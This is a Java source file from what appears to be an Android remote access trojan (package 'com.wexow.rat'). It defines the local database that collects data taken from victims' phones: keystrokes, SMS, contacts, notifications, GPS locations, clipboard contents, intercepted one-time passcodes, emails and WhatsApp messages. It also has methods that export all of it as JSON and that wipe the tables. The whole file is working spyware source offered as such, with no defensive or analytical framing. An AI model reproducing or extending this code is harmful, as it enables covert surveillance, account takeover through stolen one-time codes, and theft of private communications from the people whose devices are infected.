package com.wexow.rat.managers;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class ClientDatabase extends SQLiteOpenHelper {
    private static final String TAG = "ClientDB";
    private static final String DB_NAME = "wexow_client.db";
    private static final int DB_VERSION = 1;
    
    private static ClientDatabase instance;
    
    public static synchronized ClientDatabase getInstance(Context ctx) {
        if (instance == null) {
            instance = new ClientDatabase(ctx.getApplicationContext());
        }
        return instance;
    }
    
    private ClientDatabase(Context ctx) {
        super(ctx, DB_NAME, null, DB_VERSION);
    }
    
    @Override
    public void onCreate(SQLiteDatabase db) {
        // ⭐ Keylogs
        db.execSQL("CREATE TABLE IF NOT EXISTS keylogs (" +
            "_id INTEGER PRIMARY KEY AUTOINCREMENT, " +
            "app TEXT, data TEXT, time INTEGER, " +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // ⭐ SMS
        db.execSQL("CREATE TABLE IF NOT EXISTS sms (" +
            "_id INTEGER PRIMARY KEY AUTOINCREMENT, " +
            "address TEXT, body TEXT, date INTEGER, type INTEGER, " +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // ⭐ Contacts
        db.execSQL("CREATE TABLE IF NOT EXISTS contacts (" +
            "_id INTEGER PRIMARY KEY AUTOINCREMENT, " +
            "name TEXT, number TEXT, " +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // ⭐ Notifications
        db.execSQL("CREATE TABLE IF NOT EXISTS notifications (" +
            "_id INTEGER PRIMARY KEY AUTOINCREMENT, " +
            "app TEXT, title TEXT, content TEXT, time INTEGER, " +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // ⭐ Locations
        db.execSQL("CREATE TABLE IF NOT EXISTS locations (" +
            "_id INTEGER PRIMARY KEY AUTOINCREMENT, " +
            "lat REAL, lng REAL, accuracy REAL, address TEXT, time INTEGER, " +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // ⭐ Clipboard
        db.execSQL("CREATE TABLE IF NOT EXISTS clipboard (" +
            "_id INTEGER PRIMARY KEY AUTOINCREMENT, " +
            "content TEXT, time INTEGER, " +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // ⭐ OTP
        db.execSQL("CREATE TABLE IF NOT EXISTS otp (" +
            "_id INTEGER PRIMARY KEY AUTOINCREMENT, " +
            "otp TEXT, sender TEXT, message TEXT, time INTEGER, " +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // ⭐ Emails
        db.execSQL("CREATE TABLE IF NOT EXISTS emails (" +
            "_id INTEGER PRIMARY KEY AUTOINCREMENT, " +
            "email TEXT, name TEXT, source TEXT, " +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // ⭐ WhatsApp Messages
        db.execSQL("CREATE TABLE IF NOT EXISTS whatsapp (" +
            "_id INTEGER PRIMARY KEY AUTOINCREMENT, " +
            "sender TEXT, message TEXT, time INTEGER, " +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        // ⭐ Device Info
        db.execSQL("CREATE TABLE IF NOT EXISTS device_info (" +
            "_id INTEGER PRIMARY KEY AUTOINCREMENT, " +
            "key TEXT, value TEXT, " +
            "created_at INTEGER DEFAULT (strftime('%s','now')))");
        
        Log.e(TAG, "✅ Database created");
    }
    
    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
    }
    
    // ═══════════════════════════════════════════════════════
    // ⭐ INSERT Methods
    // ═══════════════════════════════════════════════════════
    
    public void addKeylog(String app, String data, String time) {
        try {
            SQLiteDatabase db = getWritableDatabase();
            ContentValues cv = new ContentValues();
            cv.put("app", app);
            cv.put("data", data);
            cv.put("time", System.currentTimeMillis());
            db.insert("keylogs", null, cv);
        } catch (Exception e) {
            Log.e(TAG, "addKeylog: " + e.getMessage());
        }
    }
    
    public void addSMS(String address, String body, long date, int type) {
        try {
            SQLiteDatabase db = getWritableDatabase();
            ContentValues cv = new ContentValues();
            cv.put("address", address);
            cv.put("body", body);
            cv.put("date", date);
            cv.put("type", type);
            db.insert("sms", null, cv);
        } catch (Exception e) {
            Log.e(TAG, "addSMS: " + e.getMessage());
        }
    }
    
    public void addContact(String name, String number) {
        try {
            SQLiteDatabase db = getWritableDatabase();
            ContentValues cv = new ContentValues();
            cv.put("name", name);
            cv.put("number", number);
            db.insert("contacts", null, cv);
        } catch (Exception e) {
            Log.e(TAG, "addContact: " + e.getMessage());
        }
    }
    
    public void addNotification(String app, String title, String content, String time) {
        try {
            SQLiteDatabase db = getWritableDatabase();
            ContentValues cv = new ContentValues();
            cv.put("app", app);
            cv.put("title", title);
            cv.put("content", content);
            cv.put("time", System.currentTimeMillis());
            db.insert("notifications", null, cv);
        } catch (Exception e) {
            Log.e(TAG, "addNotification: " + e.getMessage());
        }
    }
    
    public void addLocation(double lat, double lng, double accuracy, String address, long time) {
        try {
            SQLiteDatabase db = getWritableDatabase();
            ContentValues cv = new ContentValues();
            cv.put("lat", lat);
            cv.put("lng", lng);
            cv.put("accuracy", accuracy);
            cv.put("address", address);
            cv.put("time", time);
            db.insert("locations", null, cv);
        } catch (Exception e) {
            Log.e(TAG, "addLocation: " + e.getMessage());
        }
    }
    
    public void addClipboard(String content, String time) {
        try {
            SQLiteDatabase db = getWritableDatabase();
            ContentValues cv = new ContentValues();
            cv.put("content", content);
            cv.put("time", System.currentTimeMillis());
            db.insert("clipboard", null, cv);
        } catch (Exception e) {
            Log.e(TAG, "addClipboard: " + e.getMessage());
        }
    }
    
    public void addOTP(String otp, String sender, String message) {
        try {
            SQLiteDatabase db = getWritableDatabase();
            ContentValues cv = new ContentValues();
            cv.put("otp", otp);
            cv.put("sender", sender);
            cv.put("message", message);
            cv.put("time", System.currentTimeMillis());
            db.insert("otp", null, cv);
        } catch (Exception e) {
            Log.e(TAG, "addOTP: " + e.getMessage());
        }
    }
    
    public void addEmail(String email, String name, String source) {
        try {
            SQLiteDatabase db = getWritableDatabase();
            ContentValues cv = new ContentValues();
            cv.put("email", email);
            cv.put("name", name);
            cv.put("source", source);
            db.insert("emails", null, cv);
        } catch (Exception e) {
            Log.e(TAG, "addEmail: " + e.getMessage());
        }
    }
    
    public void addWhatsApp(String sender, String message, long time) {
        try {
            SQLiteDatabase db = getWritableDatabase();
            ContentValues cv = new ContentValues();
            cv.put("sender", sender);
            cv.put("message", message);
            cv.put("time", time);
            db.insert("whatsapp", null, cv);
        } catch (Exception e) {
            Log.e(TAG, "addWhatsApp: " + e.getMessage());
        }
    }
    
    public void setDeviceInfo(String key, String value) {
        try {
            SQLiteDatabase db = getWritableDatabase();
            
            db.delete("device_info", "key = ?", new String[]{ key });
            
            ContentValues cv = new ContentValues();
            cv.put("key", key);
            cv.put("value", value);
            db.insert("device_info", null, cv);
        } catch (Exception e) {
            Log.e(TAG, "setDeviceInfo: " + e.getMessage());
        }
    }
    
    // ═══════════════════════════════════════════════════════
    // ⭐ EXPORT
    // ═══════════════════════════════════════════════════════
    
    public JSONObject exportAll() {
        JSONObject result = new JSONObject();
        
        try {
            result.put("exported_at", System.currentTimeMillis());
            result.put("keylogs", exportTable("keylogs"));
            result.put("sms", exportTable("sms"));
            result.put("contacts", exportTable("contacts"));
            result.put("notifications", exportTable("notifications"));
            result.put("locations", exportTable("locations"));
            result.put("clipboard", exportTable("clipboard"));
            result.put("otp", exportTable("otp"));
            result.put("emails", exportTable("emails"));
            result.put("whatsapp", exportTable("whatsapp"));
            result.put("device_info", exportDeviceInfo());
            
            Log.e(TAG, "📤 Export complete");
        } catch (Exception e) {
            Log.e(TAG, "exportAll: " + e.getMessage());
        }
        
        return result;
    }
    
    private JSONArray exportTable(String tableName) {
        JSONArray arr = new JSONArray();
        
        try {
            SQLiteDatabase db = getReadableDatabase();
            Cursor c = db.rawQuery("SELECT * FROM " + tableName + 
                " ORDER BY _id ASC LIMIT 5000", null);
            
            if (c != null) {
                while (c.moveToNext()) {
                    JSONObject row = new JSONObject();
                    
                    for (int i = 0; i < c.getColumnCount(); i++) {
                        String col = c.getColumnName(i);
                        if (col.equals("_id")) continue;
                        
                        int type = c.getType(i);
                        if (type == Cursor.FIELD_TYPE_INTEGER) {
                            row.put(col, c.getLong(i));
                        } else if (type == Cursor.FIELD_TYPE_FLOAT) {
                            row.put(col, c.getDouble(i));
                        } else if (type == Cursor.FIELD_TYPE_NULL) {
                            row.put(col, JSONObject.NULL);
                        } else {
                            row.put(col, c.getString(i));
                        }
                    }
                    
                    arr.put(row);
                }
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "exportTable(" + tableName + "): " + e.getMessage());
        }
        
        return arr;
    }
    
    private JSONObject exportDeviceInfo() {
        JSONObject obj = new JSONObject();
        
        try {
            SQLiteDatabase db = getReadableDatabase();
            Cursor c = db.rawQuery("SELECT key, value FROM device_info", null);
            
            if (c != null) {
                while (c.moveToNext()) {
                    obj.put(c.getString(0), c.getString(1));
                }
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "exportDeviceInfo: " + e.getMessage());
        }
        
        return obj;
    }
    
    // ═══════════════════════════════════════════════════════
    // ⭐ CLEAR 
    // ═══════════════════════════════════════════════════════
    
    public void clearAll() {
        try {
            SQLiteDatabase db = getWritableDatabase();
            String[] tables = {"keylogs", "sms", "contacts", "notifications",
                "locations", "clipboard", "otp", "emails", "whatsapp", "device_info"};
            
            for (String table : tables) {
                db.delete(table, null, null);
            }
            
            Log.e(TAG, "🗑️ All tables cleared");
        } catch (Exception e) {
            Log.e(TAG, "clearAll: " + e.getMessage());
        }
    }
    
    // ═══════════════════════════════════════════════════════
    // ⭐ STATS
    // ═══════════════════════════════════════════════════════
    
    public JSONObject getStats() {
        JSONObject stats = new JSONObject();
        
        try {
            SQLiteDatabase db = getReadableDatabase();
            String[] tables = {"keylogs", "sms", "contacts", "notifications",
                "locations", "clipboard", "otp", "emails", "whatsapp"};
            
            for (String table : tables) {
                Cursor c = db.rawQuery("SELECT COUNT(*) FROM " + table, null);
                if (c != null && c.moveToFirst()) {
                    stats.put(table, c.getInt(0));
                }
                if (c != null) c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "getStats: " + e.getMessage());
        }
        
        return stats;
    }
}
